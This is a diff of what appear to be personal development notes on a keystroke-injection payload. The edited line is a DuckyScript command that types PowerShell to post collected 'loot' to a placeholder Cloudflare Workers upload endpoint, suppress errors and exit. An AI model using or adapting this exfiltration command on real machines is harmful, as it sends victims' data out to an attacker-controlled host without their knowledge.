@@ -78,7 +78,9 @@ I will continue testing and see if the behavior changes at anytime, which it pro
 There is also something that should've been obvious, but somehow I didn't learn of it, till now. There is apparently an instruction to insert a newline, instead of the weird string-escaping-foo. Looks something like this in the command to upload the data to the worker:
 
 ```
-STRING $body = $global:loot -join [Environment]::NewLine; try { Invoke-RestMethod -Method Post -Uri 'https://WORKER_URL_THING.workers.dev/api/upload' -Body $body -ContentType 'text/plain' } catch {}; exit
+STRING $body = $global:loot -join [Environment]::NewLine; \
+    try { Invoke-RestMethod -Method Post -Uri 'https://WORKER_URL_THING.workers.dev/api/upload' -Body $body -ContentType 'text/plain' } \
+    catch {}; exit
 ```
 
 Simple right? You'd think this wouldn't require all these headaches and weird workarounds because some of the information I learn later after I struggle with bugs that are just annoying.
